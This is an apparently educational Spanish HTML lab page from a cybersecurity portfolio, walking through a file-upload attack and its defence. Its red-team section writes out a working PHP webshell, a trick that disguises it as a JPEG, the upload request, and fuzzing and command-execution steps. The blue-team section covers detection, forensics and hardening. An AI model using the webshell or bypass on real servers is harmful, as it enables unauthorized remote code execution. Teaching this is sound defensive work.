<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Laboratorio: File Upload Attack vs Defense</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
        .terminal { background: #000; border: 1px solid #00ff00; border-radius: 5px; padding: 15px; margin: 10px 0; }
        .red-team { border-left: 5px solid #ff4444; background: rgba(255,68,68,0.1); }
        .blue-team { border-left: 5px solid #4444ff; background: rgba(68,68,255,0.1); }
        .code-block { background: #1a1a1a; border: 1px solid #333; padding: 10px; border-radius: 5px; }
        .step { margin: 20px 0; padding: 15px; border-radius: 8px; }
        .vulnerable-form { background: #2a2a2a; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .log-entry { font-size: 12px; color: #cccccc; margin: 2px 0; }
        .attack-success { color: #ff6666; font-weight: bold; }
        .defense-active { color: #66ff66; font-weight: bold; }
        h1, h2, h3 { color: #00dddd; }
    </style>
</head>
<body class="p-4">
    <div class="container">
        <h1 class="text-center">üéØ LABORATORIO: FILE UPLOAD VULNERABILITY</h1>
        <p class="text-center">Ejemplo pr√°ctico de Red Team vs Blue Team</p>

        <!-- ESCENARIO -->
        <div class="step">
            <h2>üìã ESCENARIO</h2>
            <p>Tienes una aplicaci√≥n web que permite subir "fotos de perfil". Tu misi√≥n:</p>
            <ul>
                <li><span class="text-danger">Red Team:</span> Subir una webshell para obtener acceso al servidor</li>
                <li><span class="text-primary">Blue Team:</span> Detectar y prevenir el ataque</li>
            </ul>
        </div>

        <!-- FASE 1: RECONOCIMIENTO -->
        <div class="step red-team">
            <h2>üîç FASE 1: RECONOCIMIENTO (RED TEAM)</h2>
            <p><strong>Objetivo:</strong> Entender c√≥mo funciona la subida de archivos</p>
            
            <div class="vulnerable-form">
                <h4>Formulario Vulnerable Simulado:</h4>
                <form id="uploadForm">
                    <label>Subir foto de perfil:</label><br>
                    <input type="file" id="fileInput" accept="image/*"><br><br>
                    <button type="button" onclick="simulateUpload()" class="btn btn-success">Subir Archivo</button>
                </form>
                <div id="uploadResult" class="mt-3"></div>
            </div>

            <div class="terminal">
                <div class="log-entry">[RED TEAM] Analizando el formulario...</div>
                <div class="log-entry">[INFO] Acepta: image/* (solo im√°genes)</div>
                <div class="log-entry">[INFO] M√©todo: POST multipart/form-data</div>
                <div class="log-entry">[RECON] Vamos a probar bypassear los filtros</div>
            </div>
        </div>

        <!-- FASE 2: CREACION DEL PAYLOAD -->
        <div class="step red-team">
            <h2>üíÄ FASE 2: CREACI√ìN DEL PAYLOAD</h2>
            <p><strong>T√©cnica:</strong> PHP Webshell disfrazada como imagen JPG</p>

            <div class="code-block">
                <h5>1. Crear webshell b√°sica (shell.php):</h5>
                <pre><code>&lt;?php
// Webshell simple para pruebas de concepto
if(isset($_GET['cmd'])) {
    echo "&lt;pre&gt;";
    system($_GET['cmd']);
    echo "&lt;/pre&gt;";
}
?&gt;</code></pre>
            </div>

            <div class="code-block">
                <h5>2. Disfrazarla como imagen (shell.jpg):</h5>
                <pre><code>// Comando Linux para a√±adir headers de imagen
echo -e "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00" > shell.jpg
cat shell.php >> shell.jpg

// Ahora shell.jpg parece una imagen v√°lida pero ejecuta PHP</code></pre>
            </div>

            <div class="terminal">
                <div class="log-entry">[RED TEAM] Payload creado: shell.jpg</div>
                <div class="log-entry">[INFO] Tama√±o: 156 bytes</div>
                <div class="log-entry">[INFO] MIME Type detectado: image/jpeg</div>
                <div class="attack-success">[SUCCESS] Bypass preparado!</div>
            </div>
        </div>

        <!-- FASE 3: ATAQUE -->
        <div class="step red-team">
            <h2>‚öîÔ∏è FASE 3: EJECUCI√ìN DEL ATAQUE</h2>
            <p><strong>Herramientas:</strong> Burp Suite para interceptar y modificar</p>

            <div class="code-block">
                <h5>3. Interceptar con Burp Suite:</h5>
                <pre><code>POST /upload.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/jpeg

[DATOS BINARIOS DE LA IMAGEN + C√ìDIGO PHP]
------WebKitFormBoundary7MA4YWxkTrZu0gW--</code></pre>
            </div>

            <div class="terminal">
                <div class="log-entry">[RED TEAM] Interceptando request...</div>
                <div class="log-entry">[BURP] Content-Type: image/jpeg ‚úì</div>
                <div class="log-entry">[BURP] Filename: shell.jpg ‚úì</div>
                <div class="log-entry">[UPLOAD] Enviando payload...</div>
                <div class="attack-success">[SUCCESS] ¬°Archivo subido como: img_1234567.jpg!</div>
            </div>
        </div>

        <!-- FASE 4: POST-EXPLOTACION -->
        <div class="step red-team">
            <h2>üéØ FASE 4: POST-EXPLOTACI√ìN</h2>
            <p><strong>Objetivo:</strong> Encontrar y ejecutar la webshell</p>

            <div class="code-block">
                <h5>4. Fuzzing para encontrar el archivo:</h5>
                <pre><code># Usando ffuf para encontrar archivos subidos
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
     -u http://vulnerable-site.com/uploads/FUZZ.jpg \
     -mc 200

# Resultado: img_1234567.jpg encontrado!</code></pre>
            </div>

            <div class="code-block">
                <h5>5. Ejecutar comandos:</h5>
                <pre><code># URL: http://vulnerable-site.com/uploads/img_1234567.jpg?cmd=whoami
# Resultado: www-data

# URL: http://vulnerable-site.com/uploads/img_1234567.jpg?cmd=ls -la
# Resultado: Lista de archivos del servidor</code></pre>
            </div>

            <div class="terminal">
                <div class="log-entry">[RED TEAM] Fuzzing en progreso...</div>
                <div class="log-entry">[FFUF] Encontrado: img_1234567.jpg [200]</div>
                <div class="log-entry">[WEBSHELL] Probando ejecuci√≥n...</div>
                <div class="attack-success">[PWNED] ¬°Webshell activa! RCE conseguido</div>
            </div>
        </div>

        <!-- AHORA CAMBIAMOS A BLUE TEAM -->
        <div class="step blue-team">
            <h2>üõ°Ô∏è RESPUESTA DEL BLUE TEAM</h2>
            <p><strong>Objetivo:</strong> Detectar, analizar y mitigar el ataque</p>

            <h4>1. DETECCI√ìN - An√°lisis de Logs:</h4>
            <div class="terminal">
                <div class="log-entry">[SOC] Analizando logs de access.log...</div>
                <div class="log-entry">[ALERT] POST /upload.php - Archivo: shell.jpg</div>
                <div class="log-entry">[ALERT] GET /uploads/img_1234567.jpg?cmd=whoami</div>
                <div class="log-entry">[ALERT] Patr√≥n sospechoso: par√°metro 'cmd'</div>
                <div class="defense-active">[INCIDENT] ¬°Posible webshell detectada!</div>
            </div>

            <h4>2. AN√ÅLISIS FORENSE:</h4>
            <div class="code-block">
                <pre><code># Examinar el archivo sospechoso
file /var/www/uploads/img_1234567.jpg
# Output: JPEG image data, JFIF standard... PHP script text

# Revisar el contenido
hexdump -C img_1234567.jpg | head -5
# Se ve header JPEG pero tambi√©n c√≥digo PHP al final

# Buscar m√°s archivos similares
find /var/www/uploads -name "*.jpg" -exec file {} \; | grep -v "JPEG image data"</code></pre>
            </div>

            <h4>3. MEDIDAS DE CONTENCI√ìN:</h4>
            <div class="terminal">
                <div class="log-entry">[BLUE TEAM] Iniciando contenci√≥n...</div>
                <div class="log-entry">[ACTION] Eliminando webshell: img_1234567.jpg</div>
                <div class="log-entry">[ACTION] Bloqueando IP atacante: 192.168.1.100</div>
                <div class="log-entry">[ACTION] Reiniciando servicios web</div>
                <div class="defense-active">[SUCCESS] Amenaza contenida</div>
            </div>
        </div>

        <!-- MEJORAS DE SEGURIDAD -->
        <div class="step blue-team">
            <h2>üîß MEDIDAS DE PREVENCI√ìN IMPLEMENTADAS</h2>

            <div class="code-block">
                <h5>1. Validaci√≥n robusta del servidor:</h5>
                <pre><code>&lt;?php
function secureFileUpload($file) {
    // 1. Verificar que es realmente una imagen
    $imageInfo = getimagesize($file['tmp_name']);
    if ($imageInfo === false) {
        throw new Exception("No es una imagen v√°lida");
    }
    
    // 2. Lista blanca de extensiones
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!in_array($imageInfo['mime'], $allowedTypes)) {
        throw new Exception("Tipo de archivo no permitido");
    }
    
    // 3. Renombrar con UUID
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    $newName = uniqid() . '.' . $extension;
    
    // 4. Mover fuera del directorio web
    $uploadPath = '/secure/uploads/' . $newName;
    
    return move_uploaded_file($file['tmp_name'], $uploadPath);
}
?&gt;</code></pre>
            </div>

            <div class="code-block">
                <h5>2. Configuraci√≥n del servidor web:</h5>
                <pre><code># .htaccess para directorio de uploads
&lt;Files "*"&gt;
    # Deshabilitar ejecuci√≥n de PHP
    php_flag engine off
&lt;/Files&gt;

# Nginx configuration
location /uploads {
    location ~ \.php$ {
        deny all;
    }
}</code></pre>
            </div>

            <div class="terminal">
                <div class="log-entry">[BLUE TEAM] Implementando mejoras...</div>
                <div class="log-entry">[CONFIG] Validaci√≥n por getimagesize() ‚úì</div>
                <div class="log-entry">[CONFIG] Lista blanca de MIME types ‚úì</div>
                <div class="log-entry">[CONFIG] Upload fuera de webroot ‚úì</div>
                <div class="log-entry">[CONFIG] PHP deshabilitado en /uploads ‚úì</div>
                <div class="defense-active">[SUCCESS] Sistema endurecido</div>
            </div>
        </div>

        <!-- SIMULADOR INTERACTIVO -->
        <div class="step">
            <h2>üéÆ SIMULADOR INTERACTIVO</h2>
            <p>Prueba los conceptos aprendidos:</p>
            
            <div class="row">
                <div class="col-md-6">
                    <h5>Prueba de Bypass:</h5>
                    <input type="text" id="testFile" class="form-control mb-2" placeholder="Nombre del archivo (ej: shell.jpg)">
                    <button onclick="testBypass()" class="btn btn-danger">Probar Ataque</button>
                    <div id="attackResult" class="mt-2"></div>
                </div>
                <div class="col-md-6">
                    <h5>Sistema de Defensa:</h5>
                    <button onclick="enableDefense()" class="btn btn-primary">Activar Defensas</button>
                    <button onclick="checkLogs()" class="btn btn-warning">Revisar Logs</button>
                    <div id="defenseResult" class="mt-2"></div>
                </div>
            </div>
        </div>

        <div class="alert alert-warning mt-4">
            <h5>‚ö†Ô∏è IMPORTANTE:</h5>
            <p>Este ejemplo es √∫nicamente para fines educativos. Nunca uses estas t√©cnicas en sistemas sin autorizaci√≥n expl√≠cita. La pr√°ctica no autorizada es ilegal y puede tener consecuencias legales graves.</p>
        </div>
    </div>

    <script>
        let defenseEnabled = false;
        let attackAttempts = [];

        function simulateUpload() {
            const fileInput = document.getElementById('fileInput');
            const result = document.getElementById('uploadResult');
            
            if (fileInput.files.length === 0) {
                result.innerHTML = '<div class="text-danger">Selecciona un archivo primero</div>';
                return;
            }
            
            const fileName = fileInput.files[0].name;
            const randomId = Math.floor(Math.random() * 1000000);
            
            result.innerHTML = `
                <div class="text-success">
                    ‚úì Archivo subido exitosamente como: img_${randomId}.jpg<br>
                    <small>Archivo original: ${fileName}</small>
                </div>
            `;
        }

        function testBypass() {
            const fileName = document.getElementById('testFile').value;
            const result = document.getElementById('attackResult');
            
            if (!fileName) {
                result.innerHTML = '<div class="text-warning">Ingresa un nombre de archivo</div>';
                return;
            }

            attackAttempts.push({
                file: fileName,
                time: new Date().toLocaleTimeString(),
                blocked: defenseEnabled
            });

            if (defenseEnabled) {
                if (fileName.includes('.php') || fileName.includes('shell')) {
                    result.innerHTML = '<div class="text-success">üõ°Ô∏è BLOQUEADO: Archivo malicioso detectado</div>';
                } else {
                    result.innerHTML = '<div class="text-warning">‚ö†Ô∏è AN√ÅLISIS: Archivo en cuarentena para revisi√≥n</div>';
                }
            } else {
                result.innerHTML = '<div class="text-danger">üíÄ √âXITO: Webshell subida, RCE disponible</div>';
            }
        }

        function enableDefense() {
            defenseEnabled = true;
            document.getElementById('defenseResult').innerHTML = '<div class="defense-active">üõ°Ô∏è Defensas ACTIVADAS</div>';
        }

        function checkLogs() {
            const result = document.getElementById('defenseResult');
            let logHtml = '<div class="terminal mt-2">';
            
            attackAttempts.forEach(attempt => {
                const status = attempt.blocked ? '[BLOCKED]' : '[ALLOWED]';
                const color = attempt.blocked ? 'color: #66ff66' : 'color: #ff6666';
                logHtml += `<div style="${color}">${attempt.time} ${status} ${attempt.file}</div>`;
            });
            
            if (attackAttempts.length === 0) {
                logHtml += '<div>No hay intentos de ataque registrados</div>';
            }
            
            logHtml += '</div>';
            result.innerHTML = logHtml;
        }
    </script>
</body>
  <footer>
    <p style="text-align: center;">¬© 2025 [sualba.dev] Todos los derechos reservados</p>
    <p style="text-align: center;">Este material forma parte de mi portfolio profesional y ha sido desarrollado como parte de mi formaci√≥n en ciberseguridad.</p>
  </footer>
</html>